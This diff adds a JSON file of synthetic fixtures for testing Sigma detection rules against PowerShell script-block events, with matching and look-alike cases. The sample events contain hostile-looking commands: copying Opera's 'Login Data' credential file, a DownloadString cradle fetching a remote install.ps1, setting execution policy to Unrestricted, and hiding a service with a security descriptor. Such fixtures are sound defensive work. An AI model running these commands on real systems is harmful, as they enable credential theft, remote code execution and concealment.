@@ -1,0 +1,442 @@
+{
+  "format_version": 1,
+  "domain": "security_events",
+  "runtime_registered": false,
+  "fixture_origin": "GuardOath-authored synthetic branch cases; not upstream tests or effectiveness evidence",
+  "rule_inventory_size": 128,
+  "review_scope": "Batches 002\u2013006 base fixtures and explicit upstream batch branch tests; selected gaps, not exhaustive branch coverage",
+  "prior_evidence_files": [
+    "tests/test_sigma_upstream_batch_002.py",
+    "tests/test_sigma_upstream_batch_003.py",
+    "tests/test_sigma_upstream_batch_004.py",
+    "tests/test_sigma_upstream_batch_005.py",
+    "tests/test_sigma_upstream_batch_006.py"
+  ],
+  "gaps": [
+    {
+      "gap_id": "SB001",
+      "rule_id": "363eccc0-279a-4ccf-a3ab-24c2e63b11fb",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_cmdlet_scheduled_task.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "89fb4d577d256c3665a449d34891412d144f510f7d49ee1e8997403b6c705145",
+      "branch": "selection_cimmethod with filter_main_legitimate_scripts",
+      "prior_evidence_gap": "Existing filter cases exercise Register-ScheduledTask; the alternative CIM path needs its own full/partial filter evidence.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace Root\\Microsoft\\Windows\\TaskScheduler"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "363eccc0-279a-4ccf-a3ab-24c2e63b11fb"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "Invoke-CimMethod -ClassName PS_ScheduledJob -NameSpace Root\\Microsoft\\Windows\\TaskScheduler"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        },
+        {
+          "case_id": "excluded",
+          "kind": "excluded",
+          "event": {
+            "ScriptBlockText": "Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace Root\\Microsoft\\Windows\\TaskScheduler Microsoft.PowerShell.Core\\Export-ModuleMember Microsoft.Management.Infrastructure.CimInstance __cmdletization_methodParameter"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        },
+        {
+          "case_id": "partial_filter_1",
+          "kind": "partial_filter_1",
+          "event": {
+            "ScriptBlockText": "Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace Root\\Microsoft\\Windows\\TaskScheduler Microsoft.Management.Infrastructure.CimInstance __cmdletization_methodParameter"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "363eccc0-279a-4ccf-a3ab-24c2e63b11fb"
+          ]
+        },
+        {
+          "case_id": "partial_filter_2",
+          "kind": "partial_filter_2",
+          "event": {
+            "ScriptBlockText": "Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace Root\\Microsoft\\Windows\\TaskScheduler Microsoft.PowerShell.Core\\Export-ModuleMember __cmdletization_methodParameter"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "363eccc0-279a-4ccf-a3ab-24c2e63b11fb"
+          ]
+        },
+        {
+          "case_id": "partial_filter_3",
+          "kind": "partial_filter_3",
+          "event": {
+            "ScriptBlockText": "Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace Root\\Microsoft\\Windows\\TaskScheduler Microsoft.PowerShell.Core\\Export-ModuleMember Microsoft.Management.Infrastructure.CimInstance"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "363eccc0-279a-4ccf-a3ab-24c2e63b11fb"
+          ]
+        }
+      ]
+    },
+    {
+      "gap_id": "SB002",
+      "rule_id": "ddcd88cb-7f62-4ce5-86f9-1704190feb0a",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_dotnet_assembly_from_file.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "6d2957012d93b6d610f304ab4e6a13a1c797a9246015eae74ad48a6b5589b95d",
+      "branch": "filter_optional_sqlserver.Path|startswith[0]",
+      "prior_evidence_gap": "Only the 64-bit Program Files prefix had a dedicated SQL filter case; cover the x86 prefix and all filter prerequisites.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "[Reflection.Assembly]::LoadFile(\"C:\\Lab\\library.dll\") SQLSERVER: { Set-Location",
+            "Path": "C:\\Lab\\SqlPsPostScript.ps1"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "ddcd88cb-7f62-4ce5-86f9-1704190feb0a"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "[Reflection.Assembly]::GetName() SQLSERVER: { Set-Location",
+            "Path": "C:\\Program Files (x86)\\Microsoft SQL Server\\Lab\\Tools\\PowerShell\\Modules\\SQLPS\\SqlPsPostScript.ps1"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        },
+        {
+          "case_id": "excluded",
+          "kind": "excluded",
+          "event": {
+            "ScriptBlockText": "[Reflection.Assembly]::LoadFile(\"C:\\Lab\\library.dll\") SQLSERVER: { Set-Location",
+            "Path": "C:\\Program Files (x86)\\Microsoft SQL Server\\Lab\\Tools\\PowerShell\\Modules\\SQLPS\\SqlPsPostScript.ps1"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        },
+        {
+          "case_id": "partial_filter_1",
+          "kind": "partial_filter_1",
+          "event": {
+            "ScriptBlockText": "[Reflection.Assembly]::LoadFile(\"C:\\Lab\\library.dll\")",
+            "Path": "C:\\Program Files (x86)\\Microsoft SQL Server\\Lab\\Tools\\PowerShell\\Modules\\SQLPS\\SqlPsPostScript.ps1"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "ddcd88cb-7f62-4ce5-86f9-1704190feb0a"
+          ]
+        },
+        {
+          "case_id": "partial_filter_2",
+          "kind": "partial_filter_2",
+          "event": {
+            "ScriptBlockText": "[Reflection.Assembly]::LoadFile(\"C:\\Lab\\library.dll\") SQLSERVER: { Set-Location"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "ddcd88cb-7f62-4ce5-86f9-1704190feb0a"
+          ]
+        },
+        {
+          "case_id": "partial_filter_3",
+          "kind": "partial_filter_3",
+          "event": {
+            "ScriptBlockText": "[Reflection.Assembly]::LoadFile(\"C:\\Lab\\library.dll\") SQLSERVER: { Set-Location",
+            "Path": "C:\\Program Files (x86)\\Microsoft SQL Server\\Lab\\Tools\\PowerShell\\Modules\\SQLPS\\Different.ps1"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "ddcd88cb-7f62-4ce5-86f9-1704190feb0a"
+          ]
+        }
+      ]
+    },
+    {
+      "gap_id": "SB003",
+      "rule_id": "21f9162c-5f5d-4b01-89a8-b705bd7d10ab",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_import_module_susp_dirs.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "2ea8a1757da1f5d801a19ffddac4f9365e953064ef2f5ddbcf2bf19f1cf3c945",
+      "branch": "selection.ScriptBlockText|contains: ipmo $Env:Temp\\",
+      "prior_evidence_gap": "The original positive uses double-quoted Import-Module; no dedicated unquoted ipmo temporary-path pair.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "ipmo $Env:Temp\\Lab.psm1"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "21f9162c-5f5d-4b01-89a8-b705bd7d10ab"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "ipmo C:\\Trusted\\Lab.psm1"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        }
+      ]
+    },
+    {
+      "gap_id": "SB004",
+      "rule_id": "21f9162c-5f5d-4b01-89a8-b705bd7d10ab",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_import_module_susp_dirs.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "2ea8a1757da1f5d801a19ffddac4f9365e953064ef2f5ddbcf2bf19f1cf3c945",
+      "branch": "selection.ScriptBlockText|contains: Import-Module '$Env:Appdata\\",
+      "prior_evidence_gap": "The original temporary-path example does not cover single-quoted Appdata imports.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "Import-Module '$Env:Appdata\\Lab.psm1'"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "21f9162c-5f5d-4b01-89a8-b705bd7d10ab"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "Import-Module 'C:\\Trusted\\Lab.psm1'"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        }
+      ]
+    },
+    {
+      "gap_id": "SB005",
+      "rule_id": "c1dda054-d638-4c16-afc8-53e007f3fbc5",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_automated_collection.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "4c7501b4fc3e9a54391a6078007187c72de507a361a70cb7fa665d99a9daf08c",
+      "branch": "selection_ext.ScriptBlockText|contains: .pdf",
+      "prior_evidence_gap": "The original file-collection positive selects .doc; no dedicated .pdf alternative pair.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "Get-ChildItem -Recurse -Include .pdf -Path C:\\Lab"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "c1dda054-d638-4c16-afc8-53e007f3fbc5"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "Get-ChildItem -Recurse -Include .csv -Path C:\\Lab"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        }
+      ]
+    },
+    {
+      "gap_id": "SB006",
+      "rule_id": "b7216a7d-687e-4c8d-82b1-3080b2ad961f",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_modify_group_policy_settings.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "c850cb022390bb8e49c9ba269d5ffc3bc5a40217a17581b26b099324a290df41",
+      "branch": "selection_key.ScriptBlockText|contains: ShellSmartScreenLevel",
+      "prior_evidence_gap": "The original key example uses EnableSmartScreen; ShellSmartScreenLevel needs independent matching/look-alike evidence.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System -Name ShellSmartScreenLevel -Value Lab"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "b7216a7d-687e-4c8d-82b1-3080b2ad961f"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System -Name LabDisplayName -Value Lab"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        }
+      ]
+    },
+    {
+      "gap_id": "SB007",
+      "rule_id": "a5a30a6e-75ca-4233-8b8c-42e0f2037d3b",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_rundll32.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "d2c41a962d67604788543cf044989d1130beaeb62db892f55cda0ed0f700acc9",
+      "branch": "selection_4104.ScriptBlockText|contains: comspec",
+      "prior_evidence_gap": "The original fixture selects value; no independent comspec branch pair with generic-keyword overlap retained.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "set x=comspec && rundll32 shell32.dll ShellExec_RunDLL"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "1f49f2ab-26bc-48b3-96cc-dcffbc93eadf",
+            "a5a30a6e-75ca-4233-8b8c-42e0f2037d3b"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "set x=comspec && rundll32 shell32.dll ShellExec_Query"
+          },
+          "target_matches": false,
+          "expected_rule_ids": [
+            "1f49f2ab-26bc-48b3-96cc-dcffbc93eadf"
+          ]
+        }
+      ]
+    },
+    {
+      "gap_id": "SB008",
+      "rule_id": "61d0475c-173f-4844-86f7-f3eebae1c66b",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_set_policies_to_unsecure_level.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "f3a900227b24048286a424716a064001f2f96b89facd2d4c54776bfef7bf98a9",
+      "branch": "filter_optional_chocolatey.ScriptBlockText|contains[1]",
+      "prior_evidence_gap": "Only the community.chocolatey.org exclusion had a dedicated case; cover the legacy chocolatey.org literal with Unrestricted.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "Set-ExecutionPolicy Unrestricted"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "61d0475c-173f-4844-86f7-f3eebae1c66b"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "Set-ExecutionPolicy AllSigned"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        },
+        {
+          "case_id": "excluded",
+          "kind": "excluded",
+          "event": {
+            "ScriptBlockText": "Set-ExecutionPolicy Unrestricted; (New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')"
+          },
+          "target_matches": false,
+          "expected_rule_ids": [
+            "403c2cc0-7f6b-4925-9423-bfa573bed7eb"
+          ]
+        },
+        {
+          "case_id": "partial_filter_1",
+          "kind": "partial_filter_1",
+          "event": {
+            "ScriptBlockText": "Set-ExecutionPolicy Unrestricted; (New-Object System.Net.WebClient).DownloadString('https://example.invalid/install.ps1')"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "403c2cc0-7f6b-4925-9423-bfa573bed7eb",
+            "61d0475c-173f-4844-86f7-f3eebae1c66b"
+          ]
+        }
+      ]
+    },
+    {
+      "gap_id": "SB009",
+      "rule_id": "953945c5-22fe-4a92-9f8a-a9edc1e522da",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_using_set_service_to_hide_services.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "01f577345197230c21bfe5fc09bd0f07adc74898cf2630fd0778faf87183f8ec",
+      "branch": "selection.ScriptBlockText|contains: -sd ",
+      "prior_evidence_gap": "The batch 006 positive selects -SecurityDescriptorSddl; no short -sd branch/look-alike pair.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "Set-Service Lab -sd DCLCWPDTSD"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "953945c5-22fe-4a92-9f8a-a9edc1e522da"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "Set-Service Lab -sd DCLCWP"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        }
+      ]
+    },
+    {
+      "gap_id": "SB010",
+      "rule_id": "fc028194-969d-4122-8abe-0470d5b8f12f",
+      "source_path": "rules/windows/powershell/powershell_script/posh_ps_access_to_browser_login_data.yml",
+      "source_revision": "05d1031f537e830b76da53bae2400c5814c89165",
+      "source_sha256": "72034c79b6cae037477e89c19c02a89ca46f8f9aa9ae164fd2408662c821f273",
+      "branch": "selection_path.ScriptBlockText|contains: \\Opera Software\\Opera Stable\\Login Data",
+      "prior_evidence_gap": "Chrome and Firefox have explicit fixtures; the Opera Login Data alternative has no dedicated pair.",
+      "cases": [
+        {
+          "case_id": "positive",
+          "kind": "positive",
+          "event": {
+            "ScriptBlockText": "Copy-Item \"C:\\Lab\\Opera Software\\Opera Stable\\Login Data\" -Destination C:\\Lab\\copy"
+          },
+          "target_matches": true,
+          "expected_rule_ids": [
+            "fc028194-969d-4122-8abe-0470d5b8f12f"
+          ]
+        },
+        {
+          "case_id": "lookalike",
+          "kind": "lookalike",
+          "event": {
+            "ScriptBlockText": "Copy-Item \"C:\\Lab\\Opera Software\\Opera Stable\\Bookmarks\" -Destination C:\\Lab\\copy"
+          },
+          "target_matches": false,
+          "expected_rule_ids": []
+        }
+      ]
+    }
+  ]
+}
